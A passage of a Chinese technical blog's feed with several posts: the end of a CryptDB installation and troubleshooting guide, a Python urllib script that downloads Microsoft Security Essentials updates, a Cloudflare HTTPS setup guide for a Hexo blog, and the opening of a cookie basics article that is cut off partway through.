class="string">`test`</span>.<span class="string">`table_XOJUPFKJFH`</span></span><br><span class="line">ENCRYPTED RESULTS:</span><br><span class="line">+<span class="comment">--------------------+--------------------+--------------------+--------------------+--------------------+</span></span><br><span class="line">|MZJAQVYXMSoPLAIN    |ZJPTNSDEPOoEq       |cdb_saltOLGYFXFRJM  |NCWFXJZAQOoEq       |cdb_saltUWACWHCBBL  |</span><br><span class="line">+<span class="comment">--------------------+--------------------+--------------------+--------------------+--------------------+</span></span><br><span class="line">|1                   |????-;??|?m???]??\pV??O?GP$?u???t???????????T??p|11367024404434184659|?T?? r??????c??O$??R???bU?????o?*)FD???|?*?9????|12229882942316980603|</span><br><span class="line">+<span class="comment">--------------------+--------------------+--------------------+--------------------+--------------------+</span></span><br></pre></td></tr></table></figure><p>从CryptDB对应的结果可以看出，不仅数据库中的记录是加密的，表中的字段也是加密的。另外，直连到<code>3306</code>端口的MySQL，也能看到test数据库和表中的内容是加密的。</p><h2 id="四、修改CryptDB密码"><a href="#四、修改CryptDB密码" class="headerlink" title="四、修改CryptDB密码"></a>四、修改CryptDB密码</h2><p>根据不同运行CryptDB的方式，密码保存的文件有所不同，上一节中使用代理的方式开启CryptDB服务，这种方式的密码保存在<code>cryptdb\mysqlproxy\wrapper.lua</code>中。修改该文件，把默认的<code>letmein</code>替换为自己的密码。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">getenv</span>(<span class="string">"CRYPTDB_PASS"</span>) <span class="keyword">or</span> <span class="string">"letmein"</span> # 替换letmein</span><br></pre></td></tr></table></figure><blockquote><p>PS：关于另外两种方式的说明<br>使用<code>Tests</code>方式运行CryptDB，修改：<code>test/test_utils.hh</code><br>使用<code>Shell</code>方式运行CryptDB，修改：<code>main/cdb_test.cc</code></p></blockquote><p>修改完CryptDB的密码，别忘了修改MySQL的密码，这两者的密码要相同：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mysqladmin -u root -p password <span class="comment"># 修改MySQL的密码</span></span><br><span class="line">Enter password:                  <span class="comment"># 输入当前密码</span></span><br><span class="line">New password:                    <span class="comment"># 输入新密码</span></span><br><span class="line">Confirm new password:            <span class="comment"># 再次输入新密码</span></span><br></pre></td></tr></table></figure><h2 id="五、重新编译CryptDB"><a href="#五、重新编译CryptDB" class="headerlink" title="五、重新编译CryptDB"></a>五、重新编译CryptDB</h2><p>如果修改了源码，在cryptdb目录中执行<code>make</code>就可以重新编译CryptDB。如果修改了UDFs，还需要以root权限执行<code>make install</code>。</p><h2 id="六、可能出现的问题"><a href="#六、可能出现的问题" class="headerlink" title="六、可能出现的问题"></a>六、可能出现的问题</h2><h3 id="1-安装时出错"><a href="#1-安装时出错" class="headerlink" title="1) 安装时出错"></a>1) 安装时出错</h3><p><strong>错误描述：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/home/yourname/cryptdb/mysql-src/sql/sql_yacc.yy:30:23: error: ‘yythd’ was not declared <span class="keyword">in</span> this scope</span><br><span class="line"><span class="comment">#define YYTHD ((THD *)yythd)</span></span><br><span class="line">^</span><br><span class="line">/home/yourname/cryptdb/mysql-src/sql/sql_yacc.yy:37:14: note: <span class="keyword">in</span> expansion of macro ‘YYTHD’</span><br><span class="line"><span class="comment">#define Lex (YYTHD-&gt;lex)</span></span><br><span class="line">^</span><br><span class="line">/home/yourname/cryptdb/mysql-src/sql/sql_yacc.yy:14618:23: note: <span class="keyword">in</span> expansion of macro ‘Lex’</span><br><span class="line">LEX *lex= Lex;</span><br><span class="line">^</span><br><span class="line">make[2]: *** [sql/CMakeFiles/sql.dir/sql_yacc.cc.o] Error 1</span><br><span class="line">make[1]: *** [sql/CMakeFiles/sql.dir/all] Error 2</span><br><span class="line">make: *** [all] Error 2</span><br><span class="line">./scripts/install.rb:176:<span class="keyword">in</span> `pretty_execute<span class="string">': `make` failed (RuntimeError)</span></span><br><span class="line"><span class="string">from ./scripts/install.rb:169:in `&gt;'</span></span><br><span class="line">from ./scripts/install.rb:135:<span class="keyword">in</span> `fn<span class="string">'</span></span><br><span class="line"><span class="string">from ./scripts/install.rb:281:in `&lt;main&gt;'</span></span><br></pre></td></tr></table></figure><p><strong>原因：</strong></p><p>对于出现的<code>yythd</code>错误，是因为安装CrpytDB时把<code>bison</code>自动更新到了最新版（bison 3 导致上述问题），需要去掉CryptDB安装脚本<code>install.rb</code>中的<code>bison</code>自动更新，手动安装<code>bison 2</code>。</p><p><strong>解决步骤：</strong></p><p><strong>(1) 去掉<code>script/install.rb</code>中的<code>bison</code>：</strong></p><p>打开<code>install.rb</code>，查找<code>bison</code>，可以看到<code>bison</code>位于<code>apt-get</code>中，说明安装时会自动更新<code>bison</code>。删除该位置的<code>bison</code>，保存<code>install.rb</code>。</p><p><strong>(2) 手动安装<code>bison 2</code>：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://launchpadlibrarian.net/140087283/libbison-dev_2.7.1.dfsg-1_amd64.deb</span><br><span class="line">wget http://launchpadlibrarian.net/140087282/bison_2.7.1.dfsg-1_amd64.deb</span><br><span class="line">dpkg -i libbison-dev_2.7.1.dfsg-1_amd64.deb</span><br><span class="line">dpkg -i bison_2.7.1.dfsg-1_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="2-删除数据库出错"><a href="#2-删除数据库出错" class="headerlink" title="2) 删除数据库出错"></a>2) 删除数据库出错</h3><p><strong>错误描述：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QUERY: select @@version_comment <span class="built_in">limit</span> 1</span><br><span class="line">main/Connect.cc:112 (execute): mysql_query: Unknown database <span class="string">'yourdroppedDB'</span></span><br><span class="line">main/Connect.cc:113 (execute): on query: USE `yourdroppedDB `</span><br><span class="line">mysql-proxy: main/rewrite_main.cc:126: std::map&lt;std::basic_string&lt;char&gt;, int&gt; collectTableNames(const string&amp;, const std::unique_ptr&lt;Connect&gt;&amp;): Assertion `c-&gt;execute(<span class="string">"USE "</span> + quoteText(db_name))<span class="string">' failed.</span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure><p><strong>原因：</strong><br>如果使用<code>3306</code>端口的MySQL而不是通过CryptDB删除加密数据库，会导致CryptDB仍然查询已经被删除的数据库而出现上述问题。</p><p><strong>解决办法：</strong><br>删除<code>cryptdb\shadow</code>目录下的所有文件。</p><h2 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h2><p><a href="https://css.csail.mit.edu/cryptdb/" target="_blank" rel="noopener">https://css.csail.mit.edu/cryptdb/</a><br>CryptDB源码中<code>doc/README</code>文档<br><a href="http://whitehatty.com/2012/09/30/cryptdb-howto-compile-on-ubuntu-linux-12-04/" target="_blank" rel="noopener">http://whitehatty.com/2012/09/30/cryptdb-howto-compile-on-ubuntu-linux-12-04/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、CryptDB介绍&quot;&gt;&lt;a href=&quot;#一、CryptDB介绍&quot; class=&quot;headerlink&quot; title=&quot;一、CryptDB介绍&quot;&gt;&lt;/a&gt;一、CryptDB介绍&lt;/h2&gt;&lt;p&gt;CryptDB是来自MIT的一个开源项目，它不是某种数据库，而是加密
      
    
    </summary>
    
    
      <category term="CryptDB" scheme="https://g2ex.top/tags/CryptDB/"/>
    
      <category term="MySQL" scheme="https://g2ex.top/tags/MySQL/"/>
    
      <category term="Ubuntu" scheme="https://g2ex.top/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Python3 urllib 获取重定向链接并下载文件</title>
    <link href="https://g2ex.top/2015/10/17/Python-urllib/"/>
    <id>https://g2ex.top/2015/10/17/Python-urllib/</id>
    <published>2015-10-17T17:25:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>计划在能上网的计算机中定期下载微软杀毒软件MSE（Microsoft Security Essentials）的离线更新包，方便其他不能上网的计算机更新病毒库。可以用Python编写下载脚本，然后在计算机中添加<code>任务计划</code>定期执行，以达到这个目的。</p><p>但在<a href="http://www.microsoft.com/security/portal/definitions/adl.aspx" title="MSE离线更新包" target="_blank" rel="noopener">MSE离线更新包</a>页面中，64-bit MSE更新包的下载链接为：<a href="http://go.microsoft.com/fwlink/?LinkID=121721&amp;arch=x64" target="_blank" rel="noopener">http://go.microsoft.com/fwlink/?LinkID=121721&amp;arch=x64</a> ，点击链接后服务器会HTTP 302跳转，然后返回真实的下载链接，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-17_164832_1.webp" alt="302跳转到真实下载链接" title="302跳转到真实下载链接"></p><p>随着离线包版本的更新，真实的下载链接会有所变动。可以用Python3 <code>urllib</code>的<code>response.geturl()</code>获取302跳转后的链接，从而下载更新包并保存到本地。</p><h2 id="二、代码实现"><a href="#二、代码实现" class="headerlink" title="二、代码实现"></a>二、代码实现</h2><p>代码比较简单，在此抛砖引玉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">DownloadMSEUpdatePackage.py: Download MSE offline update package</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_download_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    获取跳转后的真实下载链接</span></span><br><span class="line"><span class="string">    :param url: 页面中的下载链接</span></span><br><span class="line"><span class="string">    :return: 跳转后的真实下载链接</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    req = urllib.request.Request(url)</span><br><span class="line">    req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span>)</span><br><span class="line">    response = urllib.request.urlopen(req)</span><br><span class="line">    dlurl = response.geturl()     <span class="comment"># 跳转后的真实下载链接</span></span><br><span class="line">    <span class="keyword">return</span> dlurl</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_file</span><span class="params">(dlurl)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    从真实的下载链接下载文件</span></span><br><span class="line"><span class="string">    :param dlurl: 真实的下载链接</span></span><br><span class="line"><span class="string">    :return: 下载后的文件</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    req = urllib.request.Request(dlurl)</span><br><span class="line">    req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span>)</span><br><span class="line">    response = urllib.request.urlopen(req)</span><br><span class="line">    <span class="keyword">return</span> response.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">(dlurl, dlfolder)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    把下载后的文件保存到下载目录</span></span><br><span class="line"><span class="string">    :param dlurl: 真实的下载链接</span></span><br><span class="line"><span class="string">    :param dlfolder: 下载目录</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    os.chdir(dlfolder)              <span class="comment"># 跳转到下载目录</span></span><br><span class="line">    filename = dlurl.split(<span class="string">'/'</span>)[<span class="number">-1</span>] <span class="comment"># 获取下载文件名</span></span><br><span class="line">    dlfile = download_file(dlurl)</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(dlfile)</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 设置log</span></span><br><span class="line">    LOG_FILE = <span class="string">'E:\\Software\\MSE\\update.log'</span></span><br><span class="line">    logging.basicConfig(level = logging.DEBUG,</span><br><span class="line">                       format = <span class="string">'%(asctime)s - %(filename)s:%(lineno)s - %(name)s - %(message)s'</span>,</span><br><span class="line">                       filename = LOG_FILE,</span><br><span class="line">                       filemode = <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">'http://go.microsoft.com/fwlink/?LinkID=121721&amp;arch=x64'</span></span><br><span class="line">    dlfolder = <span class="string">'E:\\Software\\MSE'</span> <span class="comment"># 下载目录</span></span><br><span class="line">    logging.debug(<span class="string">'获取下载链接...'</span>)</span><br><span class="line">    dlurl = get_download_url(url)  <span class="comment"># 真实下载链接</span></span><br><span class="line">    logging.debug(<span class="string">'开始下载...'</span>)</span><br><span class="line">    save_file(dlurl, dlfolder)     <span class="comment"># 下载并保存文件</span></span><br><span class="line">    logging.debug(<span class="string">'下载完毕.'</span>)</span><br></pre></td></tr></table></figure><h2 id="三、创建任务计划程序"><a href="#三、创建任务计划程序" class="headerlink" title="三、创建任务计划程序"></a>三、创建任务计划程序</h2><p>把代码保存为<code>DownloadMSEUpdatePackage.py</code>，Windows<code>计算机</code>右键<code>管理</code>打开<code>任务计划程序</code>，<code>创建基本任务</code>或<code>创建任务</code>，设置触发器为每天执行，触发操作为启动程序<code>python yourdirectory\DownloadMSEUpdatePackage.py</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-17_165928.webp" alt="设置触发器" title="设置触发器"></p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-17_165941.webp" alt="设置触发操作" title="设置触发操作"></p><p>如果使用Linux，可以用<code>crontab</code>命令制定计划任务，<code>crontab</code>命令格式与详细例子请见 <a href="http://blog.csdn.net/ethanzhao/article/details/4406017" target="_blank" rel="noopener">http://blog.csdn.net/ethanzhao/article/details/4406017</a> 。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、说明&quot;&gt;&lt;a href=&quot;#一、说明&quot; class=&quot;headerlink&quot; title=&quot;一、说明&quot;&gt;&lt;/a&gt;一、说明&lt;/h2&gt;&lt;p&gt;计划在能上网的计算机中定期下载微软杀毒软件MSE（Microsoft Security Essentials）的离线更新包，
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="urllib" scheme="https://g2ex.top/tags/urllib/"/>
    
      <category term="MSE" scheme="https://g2ex.top/tags/MSE/"/>
    
  </entry>
  
  <entry>
    <title>为Github的Hexo博客启用SSL/TLS</title>
    <link href="https://g2ex.top/2015/10/14/Hexo-with-SSL-Hosted-on-Github-Page/"/>
    <id>https://g2ex.top/2015/10/14/Hexo-with-SSL-Hosted-on-Github-Page/</id>
    <published>2015-10-14T19:44:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>CloudFlare的免费套餐提供了SSL，可以用它为我们独立域名的博客启用HTTPS。本文以 <a href="http://g2ex.me" target="_blank" rel="noopener">http://g2ex.me</a> 为例。</p><h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><ol><li>注册CloudFlare，添加个人网站，获取CLoudFlare提供的<code>Nameservers</code>;</li><li>修改自己的域名提供商，把<code>站点的Nameservers</code>修改为<code>CloudFlare提供的Nameservers</code>；</li><li>等待CloudFlare添加的网站为激活状态，使用<code>https</code>打开个人网站；</li><li>修改网站模版，使<code>http</code>跳转到<code>https</code>。</li></ol><h2 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h2><h3 id="一、注册CloudFlare"><a href="#一、注册CloudFlare" class="headerlink" title="一、注册CloudFlare"></a>一、注册CloudFlare</h3><p>首先注册CloudFlare，注册后按照提示<code>Add Websites</code>，输入域名后点击<code>Begin Scan</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-14_115601.webp" alt="Begin Scan" title="Begin Scan"></p><p>到达最后一步，会提示把自己网站的域名<code>Name Server</code>更换为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">charles.ns.cloudflare.com</span><br><span class="line">ivy.ns.cloudflare.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-14_115333.webp" alt="CloudFlare Name Servers" title="CloudFlare Name Servers"></p><h3 id="二、修改域名提供商的Nameservers"><a href="#二、修改域名提供商的Nameservers" class="headerlink" title="二、修改域名提供商的Nameservers"></a>二、修改域名提供商的Nameservers</h3><p>本站使用了Godaddy域名提供商，登录Godaddy，在域名的<code>SETTINGS</code>中，点击<code>Nameservers</code>下的<code>Manage</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-14_120422.webp" alt="Godaddy Nameservers" title="Godaddy Nameservers"></p><p>勾选<code>Custom</code>并点击<code>ADD NAMESERVER</code>，添加上边CloudFlare给的两个Name Servers。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-14_130458.webp" alt="自定义Nameserver" title="自定义Nameserver"></p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-14_130854.webp" alt="添加CloudFlare提供的Nameservers" title="添加CloudFlare提供的Nameservers"></p><h3 id="三、等待CloudFlare确认"><a href="#三、等待CloudFlare确认" class="headerlink" title="三、等待CloudFlare确认"></a>三、等待CloudFlare确认</h3><p>稍等片刻（几分钟到十几分钟），在CloudFlare中点击<code>Recheck Nameservers</code>，可以看到网站已经处于激活状态了。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-14_131608.webp" alt="CloudFlare网站激活" title="CloudFlare网站激活"></p><p>之后，便可以用 <a href="https://g2ex.me" target="_blank" rel="noopener">https://g2ex.me</a> 访问站点了。</p><h3 id="四、强制跳转"><a href="#四、强制跳转" class="headerlink" title="四、强制跳转"></a>四、强制跳转</h3><p>至此，必须手动输入<code>https</code>前缀才能访问加密的站点，要想在任何情况下都以加密方式访问网站，可以在网站模版的头中加入<code>http</code>到<code>https</code>的强制跳转。</p><p>以当前Hexo的<a href="https://github.com/iissnan/hexo-theme-next" title="Hexo NexT主题" target="_blank" rel="noopener">NexT主题</a>为例，打开<code>layout</code>目录下的<code>_layout.swig</code>，在<code>&lt;head&gt;</code>标签中加入以下代码，注意把<code>yoursite.com</code>替换为你的域名，这里为<code>g2ex.me</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    var host = "yoursite.com";</span><br><span class="line">    if ((host == window.location.host) &amp;&amp; (window.location.protocol != "https:"))</span><br><span class="line">        window.location.protocol = "https";</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改后，使用Hexo重新部署到Github上，完毕。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.xingoxu.com/setup-log/blog-setup/github-pages-ssl.html" target="_blank" rel="noopener">https://blog.xingoxu.com/setup-log/blog-setup/github-pages-ssl.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CloudFlare的免费套餐提供了SSL，可以用它为我们独立域名的博客启用HTTPS。本文以 &lt;a href=&quot;http://g2ex.me&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://g2ex.me&lt;/a&gt; 为例。&lt;/p&gt;
&lt;h2 id
      
    
    </summary>
    
    
      <category term="Github" scheme="https://g2ex.top/tags/Github/"/>
    
      <category term="Hexo" scheme="https://g2ex.top/tags/Hexo/"/>
    
      <category term="SSL" scheme="https://g2ex.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>Cookie与Cookie劫持</title>
    <link href="https://g2ex.top/2015/06/29/Cookie-and-Cookie-Injection/"/>
    <id>https://g2ex.top/2015/06/29/Cookie-and-Cookie-Injection/</id>
    <published>2015-06-29T12:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Cookie简介"><a href="#一、Cookie简介" class="headerlink" title="一、Cookie简介"></a>一、Cookie简介</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1) 定义"></a>1) 定义</h3><p>Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员Lou Montulli在1993年3月的发明。</p><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2) 分类"></a>2) 分类</h3><p>Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。</p><p>内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。</p><h2 id="二、Cookie的用途"><a href="#二、Cookie的用途" class="headerlink" title="二、Cookie的用途"></a>二、Cookie的用途</h2><p>通常Cookie有三种主要的用途。</p><h3 id="1-Session管理"><a href="#1-Session管理" class="headerlink" title="1) Session管理"></a>1) Session管理</h3><p>http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，早期的网站用户名和密码在每次请求中会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。</p><p>所以现在大多数站点采用基于Cookie的Session管理方式：</p><p>当用户登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p><h3 id="2-个性化"><a href="#2-个性化" class="headerlink" title="2) 个性化"></a>2) 个性化</h3><p>Cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。</p><p>在购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p><p>另一个个性化应用是广告定制。你访问过的网站会写入一些Cookies在你的浏览器里，这些Cookies会被一些广告公司用来售卖更精准的广告。比如你曾访问过一家汽车网站，那你浏览其他网站时可能就会看到一些汽车类的广告。</p><h3 id="3-User-Tracking"><a href="#3-User-Tracking" class="headerlink" title="3) User Tracking"></a>3) User Tracking</h3><p>Cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。</p><h2 id="三、Cookie的基本特性"><a href="#三、Cookie的基本特性" class="headerlink" title="三、Cookie的基本特性"></a>三、Cookie的基本特性</h2><h3 id="1-http-request"><a href="#1-http-request" class="headerlink" title="1) http request"></a>1) http request</h3><p>浏览器向服务器发起的每个请求都会带上Cookie：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: foo=value1;bar=value2</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h3 id="2-http-response"><a href="#2-http-response" class="headerlink" title="2) http response"></a>2) http response</h3><p>服务器给浏览器的返回可以设置Cookie：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-type: text/html</span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=value</span><br><span class="line"><span class="built_in">Set</span>-Cookie: name2=value2; Expires=Wed,<span class="number">09</span> June <span class="number">2021</span> <span class="number">10</span>:<span class="number">18</span>:<span class="number">32</span> GMT</span><br><span class="line"></span><br><span class="line">(content <span class="keyword">of</span> page)</span><br></pre></td></tr></table></figure><h3 id="3-Cookie识别功能的说明"><a href="#3-Cookie识别功能的说明" class="headerlink" title="3) Cookie识别功能的说明"></a>3) Cookie识别功能的说明</h3><p>如果在一台计算机中安装多个浏览器，每个浏览器都会以独立的空间存放Cookie。因为Cookie中不但可以确认用户信息，还能包含计算机和浏览器的信息，所以一个用户使用不同的浏览器登录或者用不同的计算机登录，都会得到不同的Cookie信息，另一方面，对于在同一台计算机上使用同一浏览器的多用户群，Cookie不会区分他们的身份，除非他们使用不同的用户名登录。</p><h2 id="四、Cookie有关的术语"><a href="#四、Cookie有关的术语" class="headerlink" title="四、Cookie有关的术语"></a>四、Cookie有关的术语</h2><h3 id="1-Session-Cookie"><a href="#1-Session-Cookie" class="headerlink" title="1) Session Cookie"></a>1) Session Cookie</h3><p>当Cookie没有设置超时时间，那么Cookie会在浏览器退出时销毁，这种Cookie是Session Cookie。</p><h3 id="2-Persistent-Cookie-Tracking-Cookie"><a href="#2-Persistent-Cookie-Tracking-Cookie" class="headerlink" title="2) Persistent Cookie/Tracking Cookie"></a>2) Persistent Cookie/Tracking Cookie</h3><p>设置了超时时间的Cookie，会在指定时间销毁，Cookie的维持时间可以持续到浏览器退出之后，这种Cookie被持久化在浏览器中。</p><p>很多站点用Cookie跟踪用户的历史记录，例如广告类站点会使用Cookie记录浏览过哪些内容，搜索引擎会使用Cookie记录历史搜索记录，这时也可以称作Tracking Cookie，因为它被用于追踪用户行为。</p><h3 id="3-Secure-Cookie"><a href="#3-Secure-Cookie" class="headerlink" title="3) Secure Cookie"></a>3) Secure Cookie</h3><p>服务器端设置Cookie的时候，可以指定Secure属性，这时Cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有Secure Cookie。</p><p>设置secure cookie的方式举例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: foo=bar; Path=<span class="regexp">/; Secure</span></span><br></pre></td></tr></table></figure><h3 id="4-HttpOnly-Cookie"><a href="#4-HttpOnly-Cookie" class="headerlink" title="4) HttpOnly Cookie"></a>4) HttpOnly Cookie</h3><p>服务器端设置Cookie的时候，也可以指定一个HttpOnly属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: foo=bar; Path=<span class="regexp">/; 